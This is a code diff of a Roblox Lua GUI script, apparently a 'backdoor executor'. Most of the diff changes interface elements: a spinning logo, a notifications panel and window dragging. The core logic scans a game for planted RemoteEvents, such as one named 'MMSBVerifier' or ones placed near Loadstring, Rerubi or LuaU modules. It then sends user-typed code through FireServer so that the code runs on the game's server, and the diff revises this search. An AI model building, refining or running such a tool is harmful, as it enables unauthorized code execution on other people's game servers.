@@ -34,6 +34,10 @@ game.CoreGui.RobloxGui.NotificationFrame.ChildAdded:Connect(function()
 	end)
 	coroutine.resume(a)
 end)
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
 
 local MMSBNOMAINV2 = Instance.new("ScreenGui")
 local Fullscreen = Instance.new("Frame")
@@ -94,7 +98,22 @@ local Inject = Instance.new("TextButton")
 local UICorner_15 = Instance.new("UICorner")
 local Minimize = Instance.new("TextButton")
 local Minimize_2 = Instance.new("TextButton")
+local Logo_2 = Instance.new("Frame")
+local Circle_2 = Instance.new("Frame")
+local UICorner_16 = Instance.new("UICorner")
+local Arrows = Instance.new("ImageLabel")
+local ImageLabel_6 = Instance.new("ImageLabel")
+local UICorner_17 = Instance.new("UICorner")
+local InnerCircle_2 = Instance.new("Frame")
+local UICorner_18 = Instance.new("UICorner")
+local Center = Instance.new("ImageLabel")
+local Cog = Instance.new("ImageLabel")
+local ImageLabel_7 = Instance.new("ImageLabel")
 local Toggle = Instance.new("TextButton")
+local Notifications = Instance.new("Frame")
+local UIListLayout = Instance.new("UIListLayout")
+local Notif = Instance.new("Frame")
+local TextLabel_2 = Instance.new("TextLabel")
 
 --Properties:
 
@@ -105,10 +124,11 @@ Fullscreen.Name = "Fullscreen"
 Fullscreen.Parent = MMSBNOMAINV2
 Fullscreen.AnchorPoint = Vector2.new(0.5, 0.5)
 Fullscreen.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
-Fullscreen.BackgroundTransparency = 1.000
+Fullscreen.BackgroundTransparency = 0.500
 Fullscreen.Position = UDim2.new(0.5, 0, 0.5, 0)
 Fullscreen.Size = UDim2.new(1, 100, 1, 100)
-Fullscreen.ZIndex = 5
+Fullscreen.Visible = false
+Fullscreen.ZIndex = -100
 
 Window.Name = "Window"
 Window.Parent = MMSBNOMAINV2
@@ -203,9 +223,9 @@ ImageLabel_5.SliceScale = 5.000
 
 MainGui.Name = "MainGui"
 MainGui.Parent = Window
-MainGui.AnchorPoint = Vector2.new(0.5, 0.5)
+MainGui.AnchorPoint = Vector2.new(0.200000003, 0.5)
 MainGui.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
-MainGui.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainGui.Position = UDim2.new(0.200000003, 0, 0.5, 0)
 MainGui.Size = UDim2.new(0, 700, 0, 400)
 MainGui.Visible = false
 MainGui.ZIndex = -3
@@ -521,6 +541,95 @@ Minimize_2.TextScaled = true
 Minimize_2.TextSize = 14.000
 Minimize_2.TextWrapped = true
 
+Logo_2.Name = "Logo"
+Logo_2.Parent = MainGui
+Logo_2.AnchorPoint = Vector2.new(0.5, 1)
+Logo_2.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
+Logo_2.Position = UDim2.new(0.5, 0, 1, 60)
+Logo_2.Size = UDim2.new(0, 150, 0, 150)
+Logo_2.ZIndex = -2
+
+Circle_2.Name = "Circle"
+Circle_2.Parent = Logo_2
+Circle_2.AnchorPoint = Vector2.new(0.5, 0.5)
+Circle_2.BackgroundColor3 = Color3.fromRGB(107, 0, 0)
+Circle_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+Circle_2.Size = UDim2.new(0.699999988, 0, 0.699999988, 0)
+Circle_2.ZIndex = 10
+
+UICorner_16.CornerRadius = UDim.new(1, 8)
+UICorner_16.Parent = Circle_2
+
+Arrows.Name = "Arrows"
+Arrows.Parent = Circle_2
+Arrows.AnchorPoint = Vector2.new(0.5, 0.5)
+Arrows.BackgroundTransparency = 1.000
+Arrows.BorderSizePixel = 0
+Arrows.Position = UDim2.new(0.5, 0, 0.5, 0)
+Arrows.Size = UDim2.new(1, 30, 1, 30)
+Arrows.ZIndex = 10
+Arrows.Image = "http://www.roblox.com/asset/?id=6022668893"
+Arrows.ImageColor3 = Color3.fromRGB(156, 0, 0)
+
+ImageLabel_6.Parent = Circle_2
+ImageLabel_6.AnchorPoint = Vector2.new(0.5, 0.5)
+ImageLabel_6.BackgroundTransparency = 1.000
+ImageLabel_6.BorderSizePixel = 0
+ImageLabel_6.Position = UDim2.new(0.5, 0, 0.5, 0)
+ImageLabel_6.Rotation = 90.000
+ImageLabel_6.Size = UDim2.new(1, 50, 1, 50)
+ImageLabel_6.ZIndex = 11
+ImageLabel_6.Image = "http://www.roblox.com/asset/?id=6023426928"
+ImageLabel_6.ImageColor3 = Color3.fromRGB(136, 0, 0)
+
+UICorner_17.CornerRadius = UDim.new(0, 100)
+UICorner_17.Parent = Logo_2
+
+InnerCircle_2.Name = "InnerCircle"
+InnerCircle_2.Parent = Logo_2
+InnerCircle_2.AnchorPoint = Vector2.new(0.5, 0.5)
+InnerCircle_2.BackgroundColor3 = Color3.fromRGB(45, 0, 0)
+InnerCircle_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+InnerCircle_2.Size = UDim2.new(0.5, 0, 0.5, 0)
+InnerCircle_2.ZIndex = 10
+
+UICorner_18.CornerRadius = UDim.new(1, 8)
+UICorner_18.Parent = InnerCircle_2
+
+Center.Name = "Center"
+Center.Parent = InnerCircle_2
+Center.AnchorPoint = Vector2.new(0.5, 0.5)
+Center.BackgroundTransparency = 1.000
+Center.BorderSizePixel = 0
+Center.Position = UDim2.new(0.5, 0, 0.5, 0)
+Center.Size = UDim2.new(1, -20, 1, -20)
+Center.ZIndex = 15
+Center.Image = "http://www.roblox.com/asset/?id=6031251532"
+Center.ImageColor3 = Color3.fromRGB(156, 0, 0)
+
+Cog.Name = "Cog"
+Cog.Parent = InnerCircle_2
+Cog.AnchorPoint = Vector2.new(0.5, 0.5)
+Cog.BackgroundTransparency = 1.000
+Cog.BorderSizePixel = 0
+Cog.Position = UDim2.new(0.5, 0, 0.5, 0)
+Cog.Size = UDim2.new(1, 50, 1, 50)
+Cog.ZIndex = 10
+Cog.Image = "http://www.roblox.com/asset/?id=6031280882"
+Cog.ImageColor3 = Color3.fromRGB(45, 0, 0)
+Cog.SliceScale = 0.000
+
+ImageLabel_7.Parent = Logo_2
+ImageLabel_7.AnchorPoint = Vector2.new(0.5, 0.5)
+ImageLabel_7.BackgroundTransparency = 1.000
+ImageLabel_7.BorderSizePixel = 0
+ImageLabel_7.Position = UDim2.new(0.5, 0, 0.5, 0)
+ImageLabel_7.Size = UDim2.new(1, 30, 1, 30)
+ImageLabel_7.ZIndex = 9
+ImageLabel_7.Image = "http://www.roblox.com/asset/?id=6429584813"
+ImageLabel_7.ImageColor3 = Color3.fromRGB(156, 0, 0)
+ImageLabel_7.SliceScale = 5.000
+
 Toggle.Name = "Toggle"
 Toggle.Parent = Window
 Toggle.AnchorPoint = Vector2.new(0.5, 0)
@@ -535,9 +644,38 @@ Toggle.TextScaled = true
 Toggle.TextSize = 14.000
 Toggle.TextWrapped = true
 
+Notifications.Name = "Notifications"
+Notifications.Parent = MMSBNOMAINV2
+Notifications.AnchorPoint = Vector2.new(1, 0.5)
+Notifications.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Notifications.BackgroundTransparency = 1.000
+Notifications.Position = UDim2.new(1, 0, 0.5, 0)
+Notifications.Size = UDim2.new(0, 400, 1, 0)
+Notifications.Visible = false
+
+UIListLayout.Parent = Notifications
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+Notif.Name = "Notif"
+Notif.Parent = Notifications
+Notif.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+Notif.BackgroundTransparency = 0.500
+Notif.Size = UDim2.new(1, 0, 0, 150)
+Notif.Visible = false
+
+TextLabel_2.Parent = Notif
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Size = UDim2.new(1, 0, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSansBold
+TextLabel_2.Text = "StunFly"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 25.000
+TextLabel_2.TextWrapped = true
+
 -- Scripts:
 
-local function JQXIAXT_fake_script() -- CodeEntry.LocalScript 
+local function WJDL_fake_script() -- CodeEntry.LocalScript 
 	local script = Instance.new('LocalScript', CodeEntry)
 
 	local Code = script.Parent
@@ -555,221 +693,256 @@ local function JQXIAXT_fake_script() -- CodeEntry.LocalScript
 	
 	game:GetService("UserInputService").InputBegan:connect(onKeyPress)
 end
-coroutine.wrap(JQXIAXT_fake_script)()
-local function TOSEM_fake_script() -- ScrollingFrame.LocalScript 
+coroutine.wrap(WJDL_fake_script)()
+local function AXHCER_fake_script() -- ScrollingFrame.LocalScript 
 	local script = Instance.new('LocalScript', ScrollingFrame)
 
-    stringArrayToTextLabels = (function(strings, par) 
-    	local pos = UDim2.new(0,0,0,0)
-    	for q,w in pairs(strings) do
-    		if (w[1]:sub(1,1) == "^") then
-    			if (w[1]:sub(2,2) == "n") then
-    				pos = UDim2.new(0,0,0, pos.Y.Offset + 15)
-    			elseif (w[1]:sub(2,2) == "r") then
-    				pos = UDim2.new(0,pos.X.Offset,0, pos.Y.Offset + 15)
-    			elseif (w[1]:sub(2,2) == "t") then
-    				pos = UDim2.new(0, math.floor((pos.X.Offset + 25)/10)*10, 0, pos.Y.Offset)
-    			end
-    		else
-    			local lab = Instance.new("TextLabel")
-    			lab.Name = "elem" .. tostring(q);
-    			lab.Parent = par
-    			lab.Text = w[1]
-    			lab.TextColor3 = w[2]
-    			lab.Position = pos
-    			lab.BackgroundTransparency = 1
-    			lab.Font = "Arial" .. (w[3]~=nil and "Bold" or "")
-    			lab.FontSize = "Size12"
-    
-    			wait()
-    
-    			lab.Size = UDim2.new(0, lab.TextBounds.X, 0, lab.TextBounds.Y)
-    			pos = pos + UDim2.new(0, lab.TextBounds.X, 0,0)
-    		end
-    	end
-    end)
-    
-    Colors = {
-    	BLUE = Color3.new(34/255, 70/255, 128/255),
-    	GREEN = Color3.new(35/255, 110/255, 20/255),
-    	BLACK = Color3.new(.7, .7, .7),
-    	AQUA = Color3.new(46/255, 111/255, 125/255),
-    }
-    
-    Syntax = {
-    	BLUE = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
-    }
-    
-    NEWLINE = {"^n"}
-    TAB = {"^t"}
-    LINEBREAK = {"^r"}
-    
-    -- tab is char 9
-    colorizeLines = (function(lines)
-    	local instructs = {}
-    
-    	local currLine = 0
-    	for q,w in pairs(lines) do
-    		currLine = currLine + 1
-    		table.insert(instructs, {tostring(currLine)..".",  Colors.AQUA})
-    		table.insert(instructs, {"^t"})
-    
-    		local contigiousWord = ""
-    
-    		local induceContig = function(dontAppendSpace)
-    			local contigColor = Colors.BLACK
-    			local met = false
-    
-    			for e,r in pairs(Syntax) do
-    				if (not met) then
-    					for t,y in pairs(r) do
-    						if (contigiousWord == y) then
-    							contigColor = Colors[e]
-    							met = true
-    							break
-    						end
-    					end
-    				end
-    			end
-    
-    			if (contigColor == Colors.BLUE) then
-    				table.insert(instructs, {contigiousWord..(dontAppendSpace and "" or " "), contigColor, true})
-    			else
-    				table.insert(instructs, {contigiousWord..(dontAppendSpace and "" or " "), contigColor})
-    			end
-    			contigiousWord = ""
-    		end
-    
-    		for i = 1,w:len() do
-    			local j = w:sub(i,i)
-    			if (string.byte(j) == 9) then
-    				table.insert(instructs, TAB)
-    			elseif (string.byte(j) == 32) then
-    				induceContig()
-    			elseif (string.byte(j) >= 48 and string.byte(j) <=57) then -- check if number
-    				induceContig(true)
-    
-    				table.insert(instructs, {j, Colors.AQUA})
-    			else
-    				if i > 1 then
-    					if (j=="-" and w:sub(i-1,i-1)=="-") then
-    						table.insert(instructs, {w:sub(i-1), Colors.GREEN})
-    						break
-    					end
-    				end
-    
-    				contigiousWord = contigiousWord .. j
-    			end
-    		end
-    
-    		induceContig()
-    
-    		table.insert(instructs, NEWLINE)
-    	end
-    
-    	return instructs;
-    end)
-    
-    EXECUTOR = nil
-    
-    script.Parent.Parent.Execute.MouseButton1Click:Connect(function()
-    	script.Parent.CodeEntry.TextTransparency = 1
-    	for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-    		if a:IsA("UIPageLayout") then
-    		else
-    			a:Destroy()
-    			game["Run Service"].Heartbeat:Wait()
-    		end
-    	end
-    	if EXECUTOR == nil then
-    		stringArrayToTextLabels(colorizeLines({"Can't execute! There's no backdoor to execute to."}),script.Parent.TextContainer)		
-    	else
-    		stringArrayToTextLabels(colorizeLines({script.Parent.CodeEntry.Text}),script.Parent.TextContainer)	
-    		EXECUTOR:FireServer(script.Parent.CodeEntry.Text)
-    	end
-    end)
-    
-    
-    script.Parent.CodeEntry.Focused:Connect(function()
-    	for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-    		if a:IsA("UIPageLayout") then
-    		else
-    			a:Destroy()
-    			game["Run Service"].Heartbeat:Wait()
-    		end
-    	end
-    	script.Parent.CodeEntry.TextTransparency = 0
-    end)
-    
-    script.Parent.Parent.Inject.MouseButton1Click:Connect(function()
-    	local a = coroutine.create(function()
-    		for _,selectedobject in pairs(game:GetDescendants()) do
-    			if selectedobject:IsA("RemoteEvent") and selectedobject.Name == "MMSBVerifier" then
-    				EXECUTOR = selectedobject
-    			elseif selectedobject:IsA("ModuleScript") then
-    				for _,children in pairs(selectedobject:GetChildren()) do
-    				    if children.Name == "RemoteHandler" and children:IsA("Script") then
-    				        for _,remotesearch in pairs(selectedobject.Parent.Parent:GetDescendants()) do
-    							if remotesearch:IsA("RemoteEvent") then
-    							    if EXECUTOR == nil then
-    								EXECUTOR = remotesearch
-    								script.Parent.CodeEntry.TextTransparency = 1
-    								stringArrayToTextLabels(colorizeLines({"Backdoor found."}),script.Parent.TextContainer)
-    								warn(EXECUTOR.Name)
-    								wait(4)
-    								for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-    									if a:IsA("UIPageLayout") then
-    									else
-    										a:Destroy()
-    										game["Run Service"].Heartbeat:Wait()
-    									end
-    								end
-    								script.Parent.CodeEntry.TextTransparency = 0
-    							end
-    							end
+	stringArrayToTextLabels = (function(strings, par) 
+		local pos = UDim2.new(0,0,0,0)
+		for q,w in pairs(strings) do
+			if (w[1]:sub(1,1) == "^") then
+				if (w[1]:sub(2,2) == "n") then
+					pos = UDim2.new(0,0,0, pos.Y.Offset + 15)
+				elseif (w[1]:sub(2,2) == "r") then
+					pos = UDim2.new(0,pos.X.Offset,0, pos.Y.Offset + 15)
+				elseif (w[1]:sub(2,2) == "t") then
+					pos = UDim2.new(0, math.floor((pos.X.Offset + 25)/10)*10, 0, pos.Y.Offset)
+				end
+			else
+				local lab = Instance.new("TextLabel")
+				lab.Name = "elem" .. tostring(q);
+				lab.Parent = par
+				lab.Text = w[1]
+				lab.TextColor3 = w[2]
+				lab.Position = pos
+				lab.BackgroundTransparency = 1
+				lab.Font = "Arial" .. (w[3]~=nil and "Bold" or "")
+				lab.FontSize = "Size12"
+	
+				wait()
+	
+				lab.Size = UDim2.new(0, lab.TextBounds.X, 0, lab.TextBounds.Y)
+				pos = pos + UDim2.new(0, lab.TextBounds.X, 0,0)
+			end
+		end
+	end)
+	
+	Colors = {
+		BLUE = Color3.new(34/255, 70/255, 128/255),
+		GREEN = Color3.new(35/255, 110/255, 20/255),
+		BLACK = Color3.new(.7, .7, .7),
+		AQUA = Color3.new(46/255, 111/255, 125/255),
+	}
+	
+	Syntax = {
+		BLUE = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
+	}
+	
+	NEWLINE = {"^n"}
+	TAB = {"^t"}
+	LINEBREAK = {"^r"}
+	
+	-- tab is char 9
+	colorizeLines = (function(lines)
+		local instructs = {}
+	
+		local currLine = 0
+		for q,w in pairs(lines) do
+			currLine = currLine + 1
+			table.insert(instructs, {tostring(currLine)..".",  Colors.AQUA})
+			table.insert(instructs, {"^t"})
+	
+			local contigiousWord = ""
+	
+			local induceContig = function(dontAppendSpace)
+				local contigColor = Colors.BLACK
+				local met = false
+	
+				for e,r in pairs(Syntax) do
+					if (not met) then
+						for t,y in pairs(r) do
+							if (contigiousWord == y) then
+								contigColor = Colors[e]
+								met = true
+								break
+							end
 						end
-    					elseif children.Name == "Rerubi" or children.Name == "LuaU" or children.Name == "LBI" or children.Parent.Name == "Loadstring" then
-    						for _,remotesearch in pairs(selectedobject.Parent.Parent:GetDescendants()) do
-    							if remotesearch:IsA("RemoteEvent") then
-    							    if EXECUTOR == nil then
-    								EXECUTOR = remotesearch
-    								script.Parent.CodeEntry.TextTransparency = 1
-    								stringArrayToTextLabels(colorizeLines({"Backdoor found."}),script.Parent.TextContainer)
-    								warn(EXECUTOR.Name)
-    								wait(4)
-    								for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-    									if a:IsA("UIPageLayout") then
-    									else
-    										a:Destroy()
-    										game["Run Service"].Heartbeat:Wait()
-    									end
-    								end
-    								script.Parent.CodeEntry.TextTransparency = 0
-    							    end
-						    	end
-    						end
-    					end
-    				end
-    			end
-    		end
-    		if EXECUTOR == nil then
-    			script.Parent.CodeEntry.TextTransparency = 1
-    			stringArrayToTextLabels(colorizeLines({"Failed to allocate Backdoor."}),script.Parent.TextContainer)
-    			wait(4)
-    			for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
-    				if a:IsA("UIPageLayout") then
-    				else
-    					a:Destroy()
-    					game["Run Service"].Heartbeat:Wait()
-    				end
-    			end
-    			script.Parent.CodeEntry.TextTransparency = 0
-    		end
-    	end)
-    	coroutine.resume(a)
-    end)
+					end
+				end
+	
+				if (contigColor == Colors.BLUE) then
+					table.insert(instructs, {contigiousWord..(dontAppendSpace and "" or " "), contigColor, true})
+				else
+					table.insert(instructs, {contigiousWord..(dontAppendSpace and "" or " "), contigColor})
+				end
+				contigiousWord = ""
+			end
+	
+			for i = 1,w:len() do
+				local j = w:sub(i,i)
+				if (string.byte(j) == 9) then
+					table.insert(instructs, TAB)
+				elseif (string.byte(j) == 32) then
+					induceContig()
+				elseif (string.byte(j) >= 48 and string.byte(j) <=57) then -- check if number
+					induceContig(true)
+	
+					table.insert(instructs, {j, Colors.AQUA})
+				else
+					if i > 1 then
+						if (j=="-" and w:sub(i-1,i-1)=="-") then
+							table.insert(instructs, {w:sub(i-1), Colors.GREEN})
+							break
+						end
+					end
+	
+					contigiousWord = contigiousWord .. j
+				end
+			end
+	
+			induceContig()
+	
+			table.insert(instructs, NEWLINE)
+		end
+	
+		return instructs;
+	end)
+	
+	EXECUTOR = nil
+	
+	script.Parent.Parent.Execute.MouseButton1Click:Connect(function()
+		script.Parent.CodeEntry.TextTransparency = 1
+		for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+			if a:IsA("UIPageLayout") then
+			else
+				a:Destroy()
+				game["Run Service"].Heartbeat:Wait()
+			end
+		end
+		if EXECUTOR == nil then
+			stringArrayToTextLabels(colorizeLines({"Can't execute! There's no backdoor to execute to."}),script.Parent.TextContainer)		
+		else
+			stringArrayToTextLabels(colorizeLines({script.Parent.CodeEntry.Text}),script.Parent.TextContainer)	
+			EXECUTOR:FireServer(script.Parent.CodeEntry.Text)
+		end
+	end)
+	
+	
+	script.Parent.CodeEntry.Focused:Connect(function()
+		for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+			if a:IsA("UIPageLayout") then
+			else
+				a:Destroy()
+				game["Run Service"].Heartbeat:Wait()
+			end
+		end
+		script.Parent.CodeEntry.TextTransparency = 0
+	end)
+	
+	script.Parent.Parent.Inject.MouseButton1Click:Connect(function()
+		local a = coroutine.create(function()
+			for _,selectedobject in pairs(game:GetDescendants()) do
+				if selectedobject:IsA("RemoteEvent") and selectedobject.Name == "MMSBVerifier" then
+					EXECUTOR = selectedobject
+				elseif selectedobject:IsA("ModuleScript") then
+					for _,children in pairs(selectedobject:GetChildren()) do
+						if children.Name == "Rerubi" or children.Name == "LuaU" then
+							for _,remotesearch in pairs(selectedobject.Parent.Parent:GetDescendants()) do
+								if remotesearch:IsA("RemoteEvent") then
+									EXECUTOR = selectedobject
+									script.Parent.CodeEntry.TextTransparency = 1
+									stringArrayToTextLabels(colorizeLines({"Backdoor found."}),script.Parent.TextContainer)
+									wait(4)
+									for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+										if a:IsA("UIPageLayout") then
+										else
+											a:Destroy()
+											game["Run Service"].Heartbeat:Wait()
+										end
+									end
+									script.Parent.CodeEntry.TextTransparency = 0
+								end
+							end
+						end
+					end
+				end
+			end
+			if EXECUTOR == nil then
+				script.Parent.CodeEntry.TextTransparency = 1
+				stringArrayToTextLabels(colorizeLines({"Failed to allocate Backdoor."}),script.Parent.TextContainer)
+				wait(4)
+				for _,a in ipairs(script.Parent.TextContainer:GetChildren()) do
+					if a:IsA("UIPageLayout") then
+					else
+						a:Destroy()
+						game["Run Service"].Heartbeat:Wait()
+					end
+				end
+				script.Parent.CodeEntry.TextTransparency = 0
+			end
+		end)
+		coroutine.resume(a)
+	end)
 end
-coroutine.wrap(TOSEM_fake_script)()
+coroutine.wrap(AXHCER_fake_script)()
+local function PMRPF_fake_script() -- MainGui.Dragify 
+	local script = Instance.new('LocalScript', MainGui)
+
+	local UIS = game:GetService("UserInputService")
+	local dragSpeed = -math.huge
+	
+	local dragToggle = nil
+	local dragInput = nil
+	local dragStart = nil
+	local dragPos = nil
+	
+	function dragify(Frame)
+		local function updateInput(input)
+	        local Delta = input.Position - dragStart
+	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+	        script.Parent.Position = Position
+		end
+		
+	    Frame.InputBegan:Connect(function(input)
+	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
+	            dragToggle = true
+	            dragStart = input.Position
+	            startPos = Frame.Position
+	            input.Changed:Connect(function()
+	                if input.UserInputState == Enum.UserInputState.End then
+	                    dragToggle = false
+	                end
+	            end)
+	        end
+		end)
+		
+	    Frame.InputChanged:Connect(function(input)
+	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	            dragInput = input
+	        end
+		end)
+		
+	    game:GetService("UserInputService").InputChanged:Connect(function(input)
+	        if input == dragInput and dragToggle then
+	            updateInput(input)
+	        end
+	    end)
+	end
+	
+	dragify(script.Parent)
+	
+	
+	local rotate = coroutine.create(function()
+		while game["Run Service"].Heartbeat:Wait() do
+			script.Parent.Logo.Circle.Arrows.Rotation = script.Parent.Logo.Circle.Arrows.Rotation + -1
+			script.Parent.Logo.InnerCircle.Cog.Rotation = script.Parent.Logo.InnerCircle.Cog.Rotation + .5
+			script.Parent.Logo.InnerCircle.Center.Rotation = script.Parent.Logo.InnerCircle.Center.Rotation + -.2
+		end
+	end)
+	
+	coroutine.resume(rotate)
+end
+coroutine.wrap(PMRPF_fake_script)()
 
 wait(1)
 
